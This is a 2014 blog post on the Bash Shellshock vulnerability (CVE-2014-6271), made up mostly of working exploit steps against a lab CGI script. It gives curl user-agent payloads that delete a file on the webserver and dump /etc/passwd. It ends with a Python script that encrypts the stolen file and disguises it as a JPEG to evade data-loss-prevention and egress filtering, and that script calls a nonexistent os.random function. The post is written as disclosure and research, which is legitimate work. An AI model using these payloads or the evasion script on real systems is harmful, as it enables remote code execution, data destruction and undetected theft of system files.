---
layout: post
date: "2014-09-24T11:35:18-04:00"
author: "Scott Walsh"
title: "Shellshock - CVE-2014-6271"
tags:
  - development
  - "information embargo"
  - python
  - shell
  - shellshock
  - exfiltration
  - infosec
  - cve-2014-6271
  - shellshock
---
* [Overview](#overview)
* [Proof of Concept](#poc)
* [Update 1 - Fixing a header issue](#u1)
* [Update 2 - New PoCs in the wild](#u2)
* [Update 3 - DHCP lease tampering via DHCP options](#u3)
* [Update 4 - Clean up of original PoC(no more writing to disk)](#u4)
* [Update 5 - Encrypted egress to bypass DLP](#u5)

 
<a id="overview"></a>
## Overview

A fun Bash bug: it doesn't stop interpreting a variable at the end of a
functions, and is, therefore, susceptible to arbitrary command execution. If
you're using CGIs, this becomes RCE.

 
<a id="poc"></a>
## Proof of Concept

For this example, I've chosen to abuse the user-agent setting:

``` shell
$ curl http://192.168.0.1/target

PoC||GTFO
```

Great, we get a page. Now lets go looking for a CGI script... and as it happens, we've found one, poc.cgi:

```shell
#!/bin/bash
 
echo "Content-type: text/html"
echo ""
# there's a break here because Markdown doesn't like HTML when it's not tagged.
 ```

```html
echo '<html>'
echo '<head>'
echo '<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">'
echo '<title>PoC</title>'
echo '</head>'
echo '<body>'
echo '<pre>'
/usr/bin/env
echo '</pre>'
echo '</body>'
echo '</html>'

exit 0
```

Requesting this CGI gives a nice picture of the environment:

```shell
$ curl http://192.168.0.1/poc.cgi
```

```html
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>PoC</title>
</head>
<body>
<pre>
SERVER_SIGNATURE=<address>Apache/2.2.22 (Debian) Server at 192.168.0.1 Port 80</address>

HTTP_USER_AGENT=curl/7.26.0
SERVER_PORT=80
HTTP_HOST=192.168.0.1
DOCUMENT_ROOT=/var/www
SCRIPT_FILENAME=/var/www/poc.cgi
REQUEST_URI=/poc.cgi
SCRIPT_NAME=/poc.cgi
REMOTE_PORT=40974
PATH=/usr/local/bin:/usr/bin:/bin
PWD=/var/www
SERVER_ADMIN=webmaster@localhost
HTTP_ACCEPT=*/*
REMOTE_ADDR=192.168.0.1
SHLVL=1
SERVER_NAME=192.168.0.1
SERVER_SOFTWARE=Apache/2.2.22 (Debian)
QUERY_STRING=
SERVER_ADDR=192.168.0.1
GATEWAY_INTERFACE=CGI/1.1
SERVER_PROTOCOL=HTTP/1.1
REQUEST_METHOD=GET
_=/usr/bin/env
</pre>
</body>
</html>
```

Now, using the Bash bug, and the handy flag for setting the user-agent with
`curl`, we do the following evil thing:

```shell
$ curl -A "() { :; }; /bin/rm /var/www/target" http://192.168.0.1/poc.cgi
```

```html
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>500 Internal Server Error</title>
</head><body>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error or
misconfiguration and was unable to complete
your request.</p>
<p>Please contact the server administrator,
 webmaster@localhost and inform them of the time the error occurred,
and anything you might have done that may have
caused the error.</p>
<p>More information about this error may be available
in the server error log.</p>
<hr>
<address>Apache/2.2.22 (Debian) Server at 192.168.0.1 Port 80</address>
</body></html>
```

Notice that I've used a path that is owned by the webserver to avoid permission issues. Also, in quick testing, anything that wrote to STDOUT caused header errors. I even tried sending the content type in the user-agent definition. Back to checking on the damage that we have done:

```shell
$ curl http://192.168.0.1/target
```

```html
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /target was not found on this server.</p>
<hr>
<address>Apache/2.2.22 (Debian) Server at 192.168.0.1 Port 80</address>
</body></html>
```

So there it is, RCE for a Bash CGI script.

<a id="u1"></a>
## Update 1 - Fixing a header issue

Getting around the STDOUT issue wrecking headers is easier than I thought; `cat`
the file and redirect the output, then fetch the file:

```shell
$ curl -A '() { :; }; /bin/cat /etc/passwd > dumped_file' http://192.168.0.1/poc.cgi
```

```html
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>500 Internal Server Error</title>
</head><body>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error or
misconfiguration and was unable to complete
your request.</p>
<p>Please contact the server administrator,
 webmaster@localhost and inform them of the time the error occurred,
and anything you might have done that may have
caused the error.</p>
<p>More information about this error may be available
in the server error log.</p>
<hr>
<address>Apache/2.2.22 (Debian) Server at 192.168.0.1 Port 80</address>
</body></html>
```
and the fetch:

```shell
$ curl http://192.168.0.1/dumped_file

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
statd:x:102:65534::/var/lib/nfs:/bin/false
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
```

<a id="u2"></a> 
## Update 2 - New PoCs in the wild

Seeing some slick reverse shells now on pastebin. This is going to be nasty,
especially on embedded systems that aren't using busybox.

<a id="u3"></a>
## Update 3 - DHCP lease tampering via DHCP options

Talked with @loganattwood OOB about timing attacks against DHCP lease expiry &
passing shellcode via DHCP options. Nice privilege escalation scenario.

<a id="u4"></a>
## Update 4 - Clean up of original PoC(no more writing to disk)

Caught a quick, but very important , update via Twitter. Prepending an `echo` 
fixes the header issue.

```shell
# curl -A "() { foo;};echo;/bin/cat /etc/passwd" http://192.168.0.1/poc.cgi

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
statd:x:102:65534::/var/lib/nfs:/bin/false
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
```

<a id="u5"></a>
## Update 5 - Encrypted egress to bypass DLP

Dave Aitel was complaining about all of the so-called 'echo checks' that people
were using to detect Shellshock, so I suggested one of the above methods. He
said that was better, but would be caught by egress filtering. I decided that
there must be a cute way to get around it. First I gzipped and piped /etc/passwd
to base64, but it was suggested that Using OpenSSL would probably be better
depending on level of inspection at the egress point.

Code on Github

``` python
#!/usr/bin/env python

# Bypass DLP by encrypting and saying it's a jpeg.

import binascii
import os
import requests
import subprocess
import sys

iv = binascii.b2a_hex(os.random(16))
kx = binascii.b2a_hex(os.random(16))

cmd = "/usr/bin/openssl aes-256-cbc -a -salt -iv " + iv + " -K " + kx + " \
    -in /etc/passwd"

headers = {'User-agent': '() { foo; }; \
           echo Content-type:image/jpeg;echo ;echo;' + cmd}

req = requests.get(sys.argv[1], headers=headers)

cmd = ["/usr/bin/openssl", "aes-256-cbc", "-a", "-d", "-iv", iv, "-K", kx]
proc = subprocess.Popen(cmd, stdin=subprocess.PIPE)
proc.communicate(req.text.strip())
```

Gives us...

```shell
$ ./shellshock_egress http://192.168.0.1/poc.cgi
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
statd:x:102:65534::/var/lib/nfs:/bin/false
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:104:106:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:105:109::/var/run/dbus:/bin/false
```
